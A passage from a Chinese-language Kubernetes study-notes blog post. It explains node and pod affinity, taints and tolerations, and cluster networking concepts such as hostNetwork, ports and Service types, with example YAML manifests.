     <span class="hljs-comment"># 用于匹配节点</span><br>              <span class="hljs-operator">-</span> &#123; <span class="hljs-params">key:</span> zone, <span class="hljs-params">operator:</span> In, <span class="hljs-params">values:</span> [<span class="hljs-string">&quot;foo&quot;</span>] &#125;           <span class="hljs-comment"># 调度到 zone=foo 的节点</span><br>  <span class="hljs-params">containers:</span><br>    <span class="hljs-operator">-</span> <span class="hljs-params">name:</span> myapp<br>      <span class="hljs-params">image:</span> ikubernetes<span class="hljs-operator">/</span>myapp:v1<br><br></code></pre></td></tr></table></figure><blockquote><p>[!NOTE] 注意事项：<code>requiredDuringSchedulingInnoredDuringExecution</code></p><ol><li><font color="#00b0f0">调度时</font>：<ul><li>在调度时，Pod 会要求节点满足特定的条件，否则调度器不会将 Pod 调度到该节点。</li></ul></li><li><font color="#00b0f0">调度后</font>：<ul><li>一旦 Pod 被调度到节点，即使节点的条件发生变化，Pod 仍会继续运行，不会受到影响，直到 Pod 被删除或重新调度</li></ul></li></ol></blockquote><hr><h5 id="9-4-2-节点软亲和度"><a href="#9-4-2-节点软亲和度" class="headerlink" title="9.4.2. 节点软亲和度"></a>9.4.2. 节点软亲和度</h5><p>为符合条件的节点指定权重（1-100），权重越高优先级越高仅仅是“推荐”而已，就像餐厅服务员建议你坐靠窗的位置，但你坐哪儿都行。</p><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs nix"><span class="hljs-params">apiVersion:</span> apps<span class="hljs-symbol">/v1</span><br><span class="hljs-params">kind:</span> Deployment<br><span class="hljs-params">metadata:</span><br>  <span class="hljs-params">name:</span> myapp-deploy-<span class="hljs-keyword">with</span>-node-affinity<br><span class="hljs-params">spec:</span><br>  <span class="hljs-params">replicas:</span> <span class="hljs-number">2</span><br>  <span class="hljs-params">selector:</span><br>    <span class="hljs-params">matchLabels:</span><br>      <span class="hljs-params">app:</span> myapp<br>  <span class="hljs-params">template:</span><br>    <span class="hljs-params">metadata:</span><br>      <span class="hljs-params">labels:</span><br>        <span class="hljs-params">app:</span> myapp<br>    <span class="hljs-params">spec:</span><br>      <span class="hljs-params">affinity:</span><br>        <span class="hljs-params">nodeAffinity:</span><br>          <span class="hljs-params">preferredDuringSchedulingIgnoredDuringExecution:</span><br>            <span class="hljs-operator">-</span> <span class="hljs-params">weight:</span> <span class="hljs-number">60</span><br>              <span class="hljs-params">preference:</span><br>                <span class="hljs-params">matchExpressions:</span><br>                  <span class="hljs-operator">-</span> &#123; <span class="hljs-params">key:</span> zone, <span class="hljs-params">operator:</span> In, <span class="hljs-params">values:</span> [<span class="hljs-string">&quot;foo&quot;</span>] &#125;<br>            <span class="hljs-operator">-</span> <span class="hljs-params">weight:</span> <span class="hljs-number">30</span><br>              <span class="hljs-params">preference:</span><br>                <span class="hljs-params">matchExpressions:</span><br>                  <span class="hljs-operator">-</span> &#123; <span class="hljs-params">key:</span> ssd, <span class="hljs-params">operator:</span> Exists, <span class="hljs-params">values:</span> [] &#125;<br>      <span class="hljs-params">containers:</span><br>        <span class="hljs-operator">-</span> <span class="hljs-params">name:</span> myapp<br>          <span class="hljs-params">image:</span> ikubernetes<span class="hljs-operator">/</span>myapp:v1<br></code></pre></td></tr></table></figure><hr><h4 id="9-5-Pod-亲合度实战步骤"><a href="#9-5-Pod-亲合度实战步骤" class="headerlink" title="9.5. Pod 亲合度实战步骤"></a>9.5. Pod 亲合度实战步骤</h4><h5 id="9-5-1-Pod-硬亲合度"><a href="#9-5-1-Pod-硬亲合度" class="headerlink" title="9.5.1. Pod 硬亲合度"></a>9.5.1. Pod 硬亲合度</h5><p>要求当前 Pod 必须与特定标签的 Pod “同桌用餐”，Node 上必须事先存在被依赖的 Pod。</p><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs nix"><span class="hljs-params">apiVersion:</span> v1<br><span class="hljs-params">kind:</span> Pod<br><span class="hljs-params">metadata:</span><br>  <span class="hljs-params">name:</span> <span class="hljs-keyword">with</span>-pod-affinity<br><span class="hljs-params">spec:</span><br>  <span class="hljs-params">affinity:</span><br>    <span class="hljs-params">podAffinity:</span><br>      <span class="hljs-params">requiredDuringSchedulingIgnoredDuringExecution:</span><br>        <span class="hljs-operator">-</span> <span class="hljs-params">labelSelector:</span><br>            <span class="hljs-params">matchExpressions:</span><br>              <span class="hljs-operator">-</span> &#123; <span class="hljs-params">key:</span> app, <span class="hljs-params">operator:</span> In, <span class="hljs-params">values:</span> [<span class="hljs-string">&quot;tomcat&quot;</span>] &#125;<br>          <span class="hljs-params">topologyKey:</span> kubernetes.io<span class="hljs-symbol">/hostname</span><br>  <span class="hljs-params">containers:</span><br>    <span class="hljs-operator">-</span> <span class="hljs-params">name:</span> myapp<br>      <span class="hljs-params">image:</span> ikubernetes<span class="hljs-operator">/</span>myapp:v1<br></code></pre></td></tr></table></figure><hr><h5 id="9-5-2-Pod-软亲合度"><a href="#9-5-2-Pod-软亲合度" class="headerlink" title="9.5.2. Pod 软亲合度"></a>9.5.2. Pod 软亲合度</h5><p>建议同一类应用尽量“拉近关系”，比如把缓存（cache）和数据库（db）的 Pod 放在一起，但不是强制要求。</p><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs nix"><span class="hljs-params">apiVersion:</span> apps<span class="hljs-symbol">/v1</span><br><span class="hljs-params">kind:</span> Deployment<br><span class="hljs-params">metadata:</span><br>  <span class="hljs-params">name:</span> myapp-<span class="hljs-keyword">with</span>-preferred-pod-affinity<br><span class="hljs-params">spec:</span><br>  <span class="hljs-params">replicas:</span> <span class="hljs-number">3</span><br>  <span class="hljs-params">selector:</span><br>    <span class="hljs-params">matchLabels:</span><br>      <span class="hljs-params">app:</span> myapp<br>  <span class="hljs-params">template:</span><br>    <span class="hljs-params">metadata:</span><br>      <span class="hljs-params">labels:</span><br>        <span class="hljs-params">app:</span> myapp<br>    <span class="hljs-params">spec:</span><br>      <span class="hljs-params">affinity:</span><br>        <span class="hljs-params">podAffinity:</span><br>          <span class="hljs-params">preferredDuringSchedulingIgnoredDuringExecution:</span><br>            <span class="hljs-operator">-</span> <span class="hljs-params">weight:</span> <span class="hljs-number">80</span><br>              <span class="hljs-params">podAffinityTerm:</span><br>                <span class="hljs-params">labelSelector:</span><br>                  <span class="hljs-params">matchExpressions:</span><br>                    <span class="hljs-operator">-</span> &#123; <span class="hljs-params">key:</span> app, <span class="hljs-params">operator:</span> In, <span class="hljs-params">values:</span> [<span class="hljs-string">&quot;cache&quot;</span>] &#125;<br>                <span class="hljs-params">topologyKey:</span> zone<br>            <span class="hljs-operator">-</span> <span class="hljs-params">weight:</span> <span class="hljs-number">20</span><br>              <span class="hljs-params">podAffinityTerm:</span><br>                <span class="hljs-params">labelSelector:</span><br>                  <span class="hljs-params">matchExpressions:</span><br>                    <span class="hljs-operator">-</span> &#123; <span class="hljs-params">key:</span> app, <span class="hljs-params">operator:</span> In, <span class="hljs-params">values:</span> [<span class="hljs-string">&quot;db&quot;</span>] &#125;<br>                <span class="hljs-params">topologyKey:</span> zone<br>      <span class="hljs-params">containers:</span><br>        <span class="hljs-operator">-</span> <span class="hljs-params">name:</span> myapp<br>          <span class="hljs-params">image:</span> ikubernetes<span class="hljs-operator">/</span>myapp:v1<br><br></code></pre></td></tr></table></figure><hr><h5 id="9-5-3-Pod-反硬亲合度"><a href="#9-5-3-Pod-反硬亲合度" class="headerlink" title="9.5.3. Pod 反硬亲合度"></a>9.5.3. Pod 反硬亲合度</h5><ul><li>用来把相同或相似的应用分开，就像避免一桌全是亲戚，避免“群体过热”。</li><li><strong>配置方式</strong>：将 <code>podAffinity</code> 替换为 <code>podAntiAffinity</code>，可以配置强制要求（硬反亲和）或建议性要求（软反亲和）。</li></ul><figure class="highlight nestedtext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs nestedtext"><span class="hljs-attribute">apiVersion</span><span class="hljs-punctuation">:</span> <span class="hljs-string">v1</span><br><span class="hljs-attribute">kind</span><span class="hljs-punctuation">:</span> <span class="hljs-string">Pod</span><br><span class="hljs-attribute">metadata</span><span class="hljs-punctuation">:</span><br>  <span class="hljs-attribute">name</span><span class="hljs-punctuation">:</span> <span class="hljs-string">pod-first</span><br>  <span class="hljs-attribute">labels</span><span class="hljs-punctuation">:</span><br>    <span class="hljs-attribute">app</span><span class="hljs-punctuation">:</span> <span class="hljs-string">myapp</span><br>    <span class="hljs-attribute">tier</span><span class="hljs-punctuation">:</span> <span class="hljs-string">fronted</span><br><span class="hljs-attribute">spec</span><span class="hljs-punctuation">:</span><br>  <span class="hljs-attribute">containers</span><span class="hljs-punctuation">:</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-string">name: myapp</span><br>      <span class="hljs-attribute">image</span><span class="hljs-punctuation">:</span> <span class="hljs-string">ikubernetes/myapp:v1</span><br></code></pre></td></tr></table></figure><hr><h5 id="9-5-4-Pod-反软亲和度"><a href="#9-5-4-Pod-反软亲和度" class="headerlink" title="9.5.4. Pod 反软亲和度"></a>9.5.4. Pod 反软亲和度</h5><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs nix"><span class="hljs-params">apiVersion:</span> v1<br><span class="hljs-params">kind:</span> Pod<br><span class="hljs-params">metadata:</span><br>  <span class="hljs-params">name:</span> pod-second<br>  <span class="hljs-params">labels:</span><br>    <span class="hljs-params">app:</span> backend<br>    <span class="hljs-params">tier:</span> db<br><span class="hljs-params">spec:</span><br>  <span class="hljs-params">containers:</span><br>    <span class="hljs-operator">-</span> <span class="hljs-params">name:</span> busybox<br>      <span class="hljs-params">image:</span> busybox:latest<br>      <span class="hljs-params">imagePullPolicy:</span> IfNotPresent<br>      <span class="hljs-params">command:</span> [<span class="hljs-string">&quot;/bin/sh&quot;</span>, <span class="hljs-string">&quot;-c&quot;</span>, <span class="hljs-string">&quot;sleep 3600&quot;</span>]<br>  <span class="hljs-params">affinity:</span><br>    <span class="hljs-params">podAntiAffinity:</span><br>      <span class="hljs-params">requiredDuringSchedulingIgnoredDuringExecution:</span><br>        <span class="hljs-operator">-</span> <span class="hljs-params">labelSelector:</span><br>            <span class="hljs-params">matchExpressions:</span><br>              <span class="hljs-operator">-</span> &#123; <span class="hljs-params">key:</span> app, <span class="hljs-params">operator:</span> In, <span class="hljs-params">values:</span> [<span class="hljs-string">&quot;myapp&quot;</span>] &#125;<br>          <span class="hljs-params">topologyKey:</span> zone<br></code></pre></td></tr></table></figure><hr><h4 id="9-6-污点和容忍性实战步骤"><a href="#9-6-污点和容忍性实战步骤" class="headerlink" title="9.6. 污点和容忍性实战步骤"></a>9.6. 污点和容忍性实战步骤</h4><p>&#x3D;&#x3D;1.为 Node 节点添加污点&#x3D;&#x3D;</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs elixir">kubectl taint node &lt;node-name&gt; &lt;taint-key&gt;=&lt;taint-value&gt;<span class="hljs-symbol">:&lt;taint-effect&gt;</span><br></code></pre></td></tr></table></figure><p>&#x3D;&#x3D;2.配置 Pod 的容忍性&#x3D;&#x3D;</p><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs nix"><span class="hljs-params">apiVersion:</span> v1<br><span class="hljs-params">kind:</span> Pod<br><span class="hljs-params">metadata:</span><br>  <span class="hljs-params">name:</span> goproxy<br>  <span class="hljs-params">labels:</span><br>    <span class="hljs-params">app:</span> goproxy<br><span class="hljs-params">spec:</span><br>  <span class="hljs-params">containers:</span><br>  <span class="hljs-operator">-</span> <span class="hljs-params">name:</span> goproxy<br>    <span class="hljs-params">image:</span> k8s.gcr.io<span class="hljs-operator">/</span>goproxy:<span class="hljs-number">0.1</span><br><br>  <span class="hljs-params">tolerations:</span><br>    <span class="hljs-operator">-</span> <span class="hljs-params">key:</span> <span class="hljs-string">&quot;taint-key&quot;</span>               <span class="hljs-comment"># Pod 容忍的 污点 key</span><br>  <span class="hljs-params">operator:</span> <span class="hljs-string">&quot;Equal&quot;</span>              <span class="hljs-comment"># 使用等值判断，当 key、value、effect 都相同，即具有被要求的容忍度</span><br>  <span class="hljs-params">value:</span> <span class="hljs-string">&quot;taint-value&quot;</span>           <span class="hljs-comment"># Pod 容忍的 污点 value</span><br>  <span class="hljs-params">effect:</span> <span class="hljs-string">&quot;taint-effect&quot;</span>         <span class="hljs-comment"># Pod 容忍的 污点 effect</span><br>  <span class="hljs-params">tolerationSeconds:</span> <span class="hljs-number">3600</span>        <span class="hljs-comment"># Pod 被驱逐的时间倒计时，这里是 3600s</span><br></code></pre></td></tr></table></figure><blockquote><p>[!NOTE] 注意事项</p><ol><li><font color="#00b0f0">tolerationSeconds</font>：<ul><li>在 <code>NoExecute</code> 情况下，Pod 会在指定的时间（<code>tolerationSeconds</code>）后被驱逐，即使它已经容忍了该污点。</li><li>如果没有设置 <code>tolerationSeconds</code>，则 Pod 不会被驱逐，直到 Pod 不再容忍</li></ul></li><li><font color="#00b0f0">存在性判断</font>：<ul><li>在前面的示例中，我们使用了 <code>operator: &quot;Equal&quot;</code> 进行等值判断，表示 Pod 只有在 <code>key</code>、<code>value</code> 和 <code>effect</code> 都匹配时，才具备被要求的容忍度</li><li>也可以将 <code>operator</code> 配置为 <code>Exists</code>，这时 Pod 只需要匹配 <code>key</code> 和 <code>effect</code>，即具有被要求的容忍度</li></ul></li></ol></blockquote><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs nix"><span class="hljs-params">tolerations:</span><br>  <span class="hljs-operator">-</span> <span class="hljs-params">key:</span> <span class="hljs-string">&quot;key1&quot;</span><br>    <span class="hljs-params">operator:</span> <span class="hljs-string">&quot;Exists&quot;</span><br>    <span class="hljs-params">effect:</span> <span class="hljs-string">&quot;NoExecute&quot;</span><br>    <span class="hljs-params">tolerationSeconds:</span> <span class="hljs-number">3600</span><br></code></pre></td></tr></table></figure><hr><h4 id="9-7-补充：Node-节点“自污"><a href="#9-7-补充：Node-节点“自污" class="headerlink" title="9.7. 补充：Node 节点“自污"></a>9.7. 补充：Node 节点“自污</h4><p><img src="/source/_posts/%E7%AC%94%E8%AE%B0%EF%BC%9AK8s/image-20250324091041496.png"></p><hr><h3 id="10-K8S-核心概念：K8S-网络"><a href="#10-K8S-核心概念：K8S-网络" class="headerlink" title="10. K8S 核心概念：K8S 网络"></a>10. K8S 核心概念：K8S 网络</h3><h4 id="10-1-K8S-网络-引入的原因"><a href="#10-1-K8S-网络-引入的原因" class="headerlink" title="10.1. K8S 网络 引入的原因"></a>10.1. K8S 网络 引入的原因</h4><p>K8S 网络的核心作用，就是实现 <strong>容器间的通信</strong>，和 <strong>外部访问容器中的服务</strong>。</p><hr><h4 id="10-2-K8S-网络-的组成"><a href="#10-2-K8S-网络-的组成" class="headerlink" title="10.2. K8S 网络 的组成"></a>10.2. K8S 网络 的组成</h4><p>K8S 网络主要由以下几部分组成：</p><ol><li>&#x3D;&#x3D;hostNetWork&#x3D;&#x3D;：<ol><li>决定 Pod 是使用 Kubernetes 默认的网络隔离模式，还是直接复用主机的网络。虽然使用主机网络（<code>hostNetwork: true</code>）可以减少网络转发的开销，从而提升访问速度，但通常我们会保持默认设置（<code>false</code>），以保证良好的网络隔离性和应用的可移植性。</li><li><font color="#00b0f0">true</font>：<ol><li>容器将直接使用主机的网络资源，包括主机的 IP 和端口。</li><li>这种方式能提升网络性能，适用于高并发的场景（比如数据库），但通常我们会避免使用，特别是在像 Spring Boot 或 Spring Cloud 这样的应用中。默认情况下我们更倾向于保持网络隔离性和可移植性。</li></ol></li><li><font color="#00b0f0">false（默认）</font>：<ol><li>使用 Kubernetes 提供的默认网络隔离，容器有独立的网络环境，无法直接访问主机的网络。</li><li>大多数情况下，我们会选择这个选项，以确保容器和主机网络的隔离。</li></ol></li></ol></li><li>&#x3D;&#x3D;ContainerPort、hostPort 和 protocol&#x3D;&#x3D;：<ol><li>通过配置容器应用监听的端口（<code>containerPort</code>）以及将其映射到 Pod 所在宿主机端口（<code>hostPort</code>），<strong>可以实现外部通过 <code>http://&lt;host-ip&gt;:&lt;host-port&gt;</code> 的形式访问容器内的应用</strong>。</li><li>这两类端口既可以在 Pod 配置中直接声明，也可以通过 Service 的 <code>port</code> 和 <code>targetPort</code> 实现统一的端口管理。但为了提升可维护性和可扩展性，<strong>强烈建议通过 Service 来统一管理容器端口及其映射关系</strong>，而不是直接在 Pod 中显式绑定 <code>hostPort</code>。</li><li><font color="#00b0f0">ContainerPort</font>：<ol><li>容器内应用监听的端口</li></ol></li><li><font color="#00b0f0">hostPort</font>：<ol><li>容器所在宿主机端口与容器监听的端口映射</li></ol></li><li><font color="#00b0f0">protocol</font>：<ol><li>指定端口的协议类型，通常是 <code>TCP</code> 或 <code>UDP</code>。</li><li><font color="#7030a0">TCP（默认）</font>：<ol><li>一般我们都用这个，是传输控制协议，面向连接，可靠的通信。</li></ol></li><li><font color="#7030a0">UDP</font>：<ol><li>用户数据报协议，无连接，适用于不需要可靠性保障的应用（例如视频流、游戏等）。</li></ol></li></ol></li></ol></li><li>&#x3D;&#x3D;Service&#x3D;&#x3D;：<ol><li>使用 <code>http://&lt;host-ip&gt;:&lt;host-port&gt;</code> 访问 Pod 存在一些问题：<ol><li>只能访问某个固定的 Pod，其他 Pod 如何处理？</li><li>如果 Pod 迁移，你需要重新查找该 Pod 的 <code>hostIP</code>，这非常麻烦。</li></ol></li><li>而 <code>Service</code> 功能强大，它内置了负载均衡机制，能够将请求均匀分配到所有可用的 Pod，从而解决了只能访问单个 Pod 的问题，更高效地利用集群中的所有 Pod 资源。</li><li>此外，<code>Service</code> 提供多种类型，能够满足不同的需求。它既有类型支持集群内部服务间的调用，也有类型为外部访问提供稳定的 IP 地址，从而确保外部能够稳定访问 Pod<ol><li><font color="#00b0f0">内部访问</font>：<ol><li><font color="#7030a0">访问 Service IP + Service Port</font>：<code>http://&lt;service-ip&gt;:&lt;service-port&gt;</code></li><li><font color="#7030a0">访问 Service 内部域名</font>：<code>http://&lt;service-name.&lt;Service-namesapce&gt;.svc.cluster.local&gt;</code></li></ol></li><li><font color="#00b0f0">外部访问</font>：<ol><li>访问 VIP + Service Port：<code>http://&lt;VIP&gt;:&lt;service-port&gt;</code></li></ol></li></ol></li><li>需要注意的是，<code>Service IP</code> 不是某个具体主机的物理 IP，而是由 Kubernetes 提供的虚拟 IP（☆☆☆）</li></ol></li><li>&#x3D;&#x3D;Ingress&#x3D;&#x3D;：<ol><li>尽管 <code>Service Port</code> 功能强大，但外部访问时必须携带 <code>Service Port</code>。然而，我们通常通过 <code>www.example.com/search</code>、<code>www.example.com/main</code> 等 URL 直接访问，而不是像 <code>www.example.com/search:7090</code> 这样输入端口号，这该如何实现呢？</li><li>因此，<code>Ingress Controller</code> 可以作为外部流量的统一入口，可以根据 <code>Ingress</code> 资源中域名转发配置，将流量路由到对应的 Service，再由 Service 定位到具体的 Pod。这就避免了手动输入端口号的麻烦，因此相当于 Kubernetes 内部的反向代理或 API 网关。</li></ol></li><li>&#x3D;&#x3D;当前主流&#x3D;&#x3D;：<ol><li>将 <code>hostNetwork</code> 设置为 <code>false</code>，<strong>保持默认的网络隔离</strong>，同时通过 Service <strong>统一管理容器端口及其映射关系</strong>。</li><li>通过 <code>Ingress Controller LoadBalancer Service</code> 接收外部请求，并将请求负载均衡到 <code>Ingress Controller Pod</code>。然后，按照 <code>Ingress</code> 配置的域名转发规则，将请求转发到相应的 <code>Pod Service</code>，接着将请求负载均衡到具体的 <code>Pod</code>，由 <code>Pod</code> 中的服务进行业务处理。</li></ol></li></ol><hr><h4 id="10-3-hostNetWork-实战步骤"><a href="#10-3-hostNetWork-实战步骤" class="headerlink" title="10.3. hostNetWork 实战步骤"></a>10.3. hostNetWork 实战步骤</h4><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs nix"><span class="hljs-params">apiVersion:</span> v1<br><br><span class="hljs-params">kind:</span> Pod<br><br><span class="hljs-params">metadata:</span><br>  <span class="hljs-params">name:</span> my-pod<br>  <span class="hljs-params">namespace:</span> default<br>  <br><span class="hljs-params">spec:</span><br>  <span class="hljs-params">hostNetwork:</span> <span class="hljs-literal">false</span>                              <span class="hljs-comment"># 是否使用宿主机网络，默认 false，一般也使用 false</span><br>  <span class="hljs-params">containers:</span><br>    <span class="hljs-operator">-</span> <span class="hljs-params">name:</span> my-container<br>      <span class="hljs-params">image:</span> nginx:latest<br></code></pre></td></tr></table></figure><hr><h4 id="10-4-ContainerPort、hostPort-和-protocol-实战步骤"><a href="#10-4-ContainerPort、hostPort-和-protocol-实战步骤" class="headerlink" title="10.4. ContainerPort、hostPort 和 protocol 实战步骤"></a>10.4. ContainerPort、hostPort 和 protocol 实战步骤</h4><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">apiVersion:</span> <span class="hljs-string">v1</span><br><br><span class="hljs-attr">kind:</span> <span class="hljs-string">Pod</span><br><br><span class="hljs-attr">metadata:</span><br>  <span class="hljs-attr">name:</span> <span class="hljs-string">my-pod</span><br>  <span class="hljs-attr">namespace:</span> <span class="hljs-string">xxxxxx</span><br>  <br><span class="hljs-attr">spec:</span><br>  <span class="hljs-attr">containers:</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">my-container</span><br>      <span class="hljs-attr">image:</span> <span class="hljs-string">nginx:latest</span><br>      <span class="hljs-attr">ports:</span><br>        <span class="hljs-bullet">-</span> <span class="hljs-attr">containerPort:</span> <span class="hljs-number">80</span>                          <span class="hljs-comment"># 容器内应用监听的端口</span><br>          <span class="hljs-attr">hostPort:</span> <span class="hljs-number">8080</span>                             <span class="hljs-comment"># 容器所在宿主机端口与容器监听的端口映射</span><br>          <span class="hljs-attr">protocol:</span> <span class="hljs-string">TCP</span>                              <span class="hljs-comment"># 端口的协议类型，为 TCP 或 UDP</span><br></code></pre></td></tr></table></figure><blockquote><p>[!NOTE] 注意事项</p><ol><li>这里选择在 Pod 中进行配置仅作为示例，生产环境中强烈不推荐如此配置。</li><li>推荐在 Service 中进行统一配置，以确保更好的管理和维护。</li></ol></blockquote><hr><h4 id="10-5-Service-实战步骤"><a href="#10-5-Service-实战步骤" class="headerlink" title="10.5. Service 实战步骤"></a>10.5. Service 实战步骤</h4><h5 id="10-5-1-Service-的分类"><a href="#10-5-1-Service-的分类" class="headerlink" title="10.5.1. Service 的分类"></a>10.5.1. Service 的分类</h5><p><code>Service</code> 由以下四种类型组成：</p><ol><li>&#x3D;&#x3D;ClusterIP 类型（默认）&#x3D;&#x3D;：<ol><li>该类型的 Service 仅在集群内部暴露服务，即内部 Pod 可以互相访问调用，而外部客户端无法直接访问</li><li><font color="#00b0f0">内部访问</font>：<ol><li><font color="#7030a0">访问 Service IP + Service Port</font>：<code>http://&lt;service-ip&gt;:&lt;service-port&gt;</code></li><li><font color="#7030a0">访问 Service 内部域名</font>：<code>http://&lt;service-name&gt;.&lt;service-namespace&gt;.svc.cluster.local</code></li></ol></li><li><font color="#00b0f0">注意事项</font>：<ol><li>由于 Service IP 是固定的，所以为访问 Pod 提供了稳定的入口</li><li>内部访问时，Service 会采用轮询（Round Robin）的方式，将请求均匀分发到所有功能相同的 Pod。</li></ol></li></ol></li><li>&#x3D;&#x3D;NodePort 类型&#x3D;&#x3D;：<ol><li><code>NodePort</code> 类型的 Service 不仅可以在集群内部暴露服务，还允许集群外部的客户端访问。然而，由于外部访问的 IP 地址不稳定，通常不推荐使用这种类型。</li><li><font color="#00b0f0">内部访问</font>：<ol><li><font color="#7030a0">访问 Service IP + Service Port</font>：<code>http://10.96.12.34:80</code></li><li><font color="#7030a0">访问 Service 内部域名</font>：<code>http://&lt;service-name&gt;.&lt;service-namespace&gt;.svc.cluster.local</code></li><li><font color="#7030a0">注意事项</font>：<ol><li>由于 Service 的 IP 是固定的，所以为访问 Pod 提供了稳定的入口</li><li>同样，内部访问时 Service 会自动采用轮询（Round Robin）的方式，将请求均匀分发到所有对应的 Pod。</li></ol></li></ol></li><li><font color="#00b0f0">外部访问</font>：<ol><li><font color="#7030a0">访问 Node IP + Node Port</font>：<code>http://192.168.100.210:32600</code></li><li>在每台运行 Pod 的宿主机上，Kubernetes 会分配一个介于 <code>30000~32767</code> 之间的 NodePort，外部客户端通过 <code>NodeIP + NodePort</code> 访问服务时，<font color="#ff0000">请求会经过 <code>NodeIP:NodePort -&gt; ServiceIP:ServicePort -&gt; Pod:PodPort</code></font></li><li><font color="#7030a0">注意事项</font>：<ol><li><font color="#c00000">由于 Pod 所在 Node 的 IP 可能变化，因此直接依赖 Node IP 无法提供完全稳定的访问入口（☆☆☆）</font></li><li>尽管外部访问看似连接到固定的 Pod，Service 依旧会以轮询（Round Robin）的方式分发请求到所有具备相同功能的 Pod，而非固定转发到某个特定 Node</li><li>如果一台服务器上运行多个 Pod，则可能会分配多个不同的 NodePort，只要不发生 <code>Service Port</code> 和 <code>NodePort</code> 端口冲突即可。</li></ol></li></ol></li></ol></li><li>&#x3D;&#x3D;LoadBalancer 类型&#x3D;&#x3D;：<ol><li><code>LoadBalancer</code> 类型的 Service，其特点在于，一旦创建该类型的 Service，系统（MetalLB 或 云服务）会自动为其分配一个固定的 VIP</li><li>该类型主要用于云环境（如阿里云、AWS、Google Cloud 等），在内网或裸机部署的 Kubernetes 集群中，可以借助 MetalLB 来模拟云环境下的负载均衡器。</li><li><font color="#00b0f0">内部访问</font>：<ol><li><font color="#7030a0">访问 Service IP + Service Port</font>：<code>http://10.96.12.34:80</code></li><li><font color="#7030a0">访问 Service 内部域名</font>：<code>http://&lt;service-name&gt;.&lt;service-namespace&gt;.svc.cluster.local</code></li></ol></li><li><font color="#00b0f0">外部访问</font>：<ol><li><font color="#7030a0">访问 VIP + Service Port</font>：<code>http://192.168.136.210:80</code></li></ol></li></ol></li><li>&#x3D;&#x3D;ExternalName 类型&#x3D;&#x3D;<ol><li>该类型的 <code>Service</code> 相对特殊，主要用于访问 集群外部 的服务，而 不是 